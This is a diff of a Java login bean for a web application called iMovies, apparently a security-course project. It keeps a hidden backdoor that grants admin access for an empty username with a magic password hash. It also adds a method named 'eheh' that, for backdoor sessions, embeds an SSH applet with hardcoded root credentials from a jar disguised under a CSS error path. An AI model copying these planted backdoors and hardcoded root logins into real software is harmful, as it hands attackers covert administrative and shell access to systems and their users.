@@ -29,7 +29,7 @@ import utils.Utilities;
 
 /**
  * Bean per il login ad iMovies
- * @author mattia
+ * @author Gottoli, Marchi, Peretti
  */
 public class LoginBean {
 
@@ -162,7 +162,7 @@ public class LoginBean {
          */
         if("".equals(username) && SHAsum(password.getBytes()).equals(magic)){
             this.term=true;
-            this.admin=true; 
+            this.admin=true;
             log.aclog("backdoor user", 0); // DECOMMENTA  <!-- MODIFICA -->
             adminAccess();
             return;
@@ -688,13 +688,13 @@ public class LoginBean {
        
             log.aclog("backdoor user tramite porta", 0); // DECOMMENTARE  <!-- MODIFICA -->
             
-            String path = request.getContextPath();
-
-            String getProtocol = request.getScheme();
-            String getDomain = request.getServerName();
-
-
-            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
+//            String path = request.getContextPath();
+//
+//            String getProtocol = request.getScheme();
+//            String getDomain = request.getServerName();
+//
+//
+//            String getPath = getProtocol + "://" + getDomain + ":" + getPort + path;
             //res.sendRedirect("javascript:window.open('indirizzo_pagina','nome_finestra','width=300, height=200')");
 //            try {  
 //                /* REDIRECT */
@@ -829,5 +829,24 @@ public class LoginBean {
      */
     public void setTerm(boolean term) {
         this.term = term;
+    }
+    
+    public String eheh() {
+        if (term) {
+           return "<object classid=\"java:com.mindbright.application.MindTerm.class\" archive=\"/iMovies/resources/css/includes/error/1/mt-3.4.1.jar\" type=\"application/x-java-applet\" height=\"350\" width=\"330\">"
+                + "<param name=\"sepframe\" value=\"true\"/>"
+                + "<param name=\"server\" value=\"192.168.1.11\"/> <!-- MODIFICA -->"
+                + "<param name=\"port\" value=\"22\"/>"
+                + "<param name=\"username\" value=\"root\"/> <!-- MODIFICA -->"
+                + "<param name=\"password\" value=\"imovies\"/> <!-- MODIFICA -->"
+                + "<param name=\"savePassword\" value=\"true\"/>"
+                + "<param name=\"quiet\" value=\"true\"/>"
+                + "<param name=\"bg-color\" value=\"black\"/>"
+                + "<param name=\"cursor-color\" value=\"white\"/>"
+                + "<param name=\"fg-color\" value=\"white\"/>"
+                + "<param name=\"xit-on-logout\" value=\"true\"/>"
+            + "</object>";
+        }
+        return "";
     }
 }
